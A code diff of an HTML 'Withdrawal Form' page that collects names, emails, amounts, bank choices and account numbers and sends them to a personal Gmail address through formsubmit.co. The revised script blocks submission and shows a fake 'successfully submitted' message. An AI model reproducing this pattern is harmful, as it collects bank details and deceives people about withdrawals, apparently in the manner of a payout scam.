@@ -8,145 +8,114 @@
         body {
             font-family: Arial, sans-serif;
             background-color: #f2f2f2;
-            margin: 0;
-            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            width: 50%;
-            margin: auto;
-            background-color: white;
+            background-color: #fff;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
         }
-        h2 {
-            text-align: center;
+        .container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
         }
-        .form-group {
-            margin-bottom: 15px;
+        .container label {
+            font-size: 14px;
+            color: #333;
         }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-        .form-group input, .form-group select {
+        .container input, .container select {
             width: 100%;
             padding: 10px;
+            margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
+            box-sizing: border-box;
         }
-        .form-group input[type="submit"] {
+        .container button {
             background-color: #4CAF50;
             color: white;
+            padding: 10px 20px;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
-        .form-group input[type="submit"]:hover {
+        .container button:hover {
             background-color: #45a049;
         }
         .success-message {
             display: none;
-            text-align: center;
             color: green;
-            font-size: 18px;
             margin-top: 20px;
-        }
-        .error-message {
-            display: none;
-            text-align: center;
-            color: red;
-            font-size: 18px;
-            margin-top: 20px;
-        }
-        .hidden-field {
-            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>Withdrawal Form</h2>
-        <form id="withdrawalForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="post">
-            <div class="form-group">
-                <label for="email">Email Address:</label>
-                <input type="email" id="email" name="email" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
-            </div>
-            <div class="form-group">
-                <label for="accountName">Account Name:</label>
-                <input type="text" id="accountName" name="accountName" required>
-            </div>
-            <div class="form-group">
-                <label for="accountNumber">Account Number:</label>
-                <input type="text" id="accountNumber" name="accountNumber" required>
-            </div>
-            <div class="form-group">
-                <label for="bank">Select Bank:</label>
-                <select id="bank" name="bank" required>
-                    <option value="">--Select Bank--</option>
-                    <option value="Access Bank">Access Bank</option>
-                    <option value="Citibank">Citibank</option>
-                    <option value="Ecobank">Ecobank</option>
-                    <option value="Fidelity Bank">Fidelity Bank</option>
-                    <option value="First Bank of Nigeria">First Bank of Nigeria</option>
-                    <option value="Guaranty Trust Bank">Guaranty Trust Bank</option>
-                    <option value="Heritage Bank">Heritage Bank</option>
-                    <option value="Keystone Bank">Keystone Bank</option>
-                    <option value="OPAY">OPAY</option>
-                    <option value="Palmpay">Palmpay</option>
-                    <option value="Polaris Bank">Polaris Bank</option>
-                    <option value="Providus Bank">Providus Bank</option>
-                    <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
-                    <option value="Standard Chartered Bank">Standard Chartered Bank</option>
-                    <option value="Sterling Bank">Sterling Bank</option>
-                    <option value="Union Bank">Union Bank</option>
-                    <option value="United Bank for Africa">United Bank for Africa</option>
-                    <option value="Wema Bank">Wema Bank</option>
-                    <option value="Zenith Bank">Zenith Bank</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="amount">Amount:</label>
-                <input type="number" id="amount" name="amount" required>
-            </div>
-            <div class="form-group">
-                <label for="mobile">Beneficiary's Mobile Number:</label>
-                <input type="tel" id="mobile" name="mobile" pattern="[0-9]{11}" required>
-            </div>
-            <div class="hidden-field">
-                <label for="honeypot">Leave this field empty</label>
-                <input type="text" id="honeypot" name="honeypot">
-            </div>
-            <div class="form-group">
-                <input type="submit" value="Submit">
-            </div>
+        <form id="withdrawalForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="amount">Amount</label>
+            <input type="number" id="amount" name="amount" required>
+
+            <label for="bank">Select Bank</label>
+            <select id="bank" name="bank" required>
+                <option value="access-bank">Access Bank</option>
+                <option value="citibank">Citibank</option>
+                <option value="diamond-bank">Diamond Bank</option>
+                <option value="ecobank">Ecobank</option>
+                <option value="fidelity-bank">Fidelity Bank</option>
+                <option value="first-bank">First Bank</option>
+                <option value="fcmb">First City Monument Bank (FCMB)</option>
+                <option value="gtbank">Guarantee Trust Bank (GTB)</option>
+                <option value="heritage-bank">Heritage Bank</option>
+                <option value="keystone-bank">Keystone Bank</option>
+                <option value="polaris-bank">Polaris Bank</option>
+                <option value="providus-bank">Providus Bank</option>
+                <option value="stanbic-ibtc">Stanbic IBTC Bank</option>
+                <option value="standard-chartered">Standard Chartered Bank</option>
+                <option value="sterling-bank">Sterling Bank</option>
+                <option value="suntrust-bank">Suntrust Bank</option>
+                <option value="union-bank">Union Bank</option>
+                <option value="uba">United Bank for Africa (UBA)</option>
+                <option value="unity-bank">Unity Bank</option>
+                <option value="wema-bank">Wema Bank</option>
+                <option value="zenith-bank">Zenith Bank</option>
+                <option value="opay">OPAY</option>
+                <option value="palmpay">Palmpay</option>
+            </select>
+
+            <label for="account-number">Account Number</label>
+            <input type="text" id="account-number" name="account-number" required>
+
+            <button type="submit">Submit</button>
         </form>
         <div class="success-message" id="successMessage">
-            Your withdrawal form has been processed. Please wait for confirmation. Do not close your browser.
-        </div>
-        <div class="error-message" id="errorMessage">
-            There was an error submitting your form. Please try again.
+            Your withdrawal request has been successfully submitted! Please wait for confirmation do not close your browser.
         </div>
     </div>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
     <script>
         document.getElementById('withdrawalForm').addEventListener('submit', function(event) {
-            const honeypot = document.getElementById('honeypot').value;
-            if (honeypot) {
-                event.preventDefault();
-                document.getElementById('errorMessage').textContent = 'Spam detected!';
-                document.getElementById('errorMessage').style.display = 'block';
-                return;
-            }
+            event.preventDefault(); // Prevent the default form submission
 
-            // Simulate form submission success or error
-            const isSuccess = true; // Change to false to simulate an error
-            if (isSuccess) {
+            // Simulate a form submission
+            setTimeout(function() {
+                document.getElementById('withdrawalForm').style.display = 'none';
                 document.getElementById('successMessage').style.display = 'block';
-                document.getElementById('errorMessage').style.display = 'none';
-            } else {
-                document.getElementById('successMessage').style.display = 'none';
-                document.getElementById('errorMessage').style.display = 'block';
-            }
+            }, 1000);
         });
     </script>
 </body>
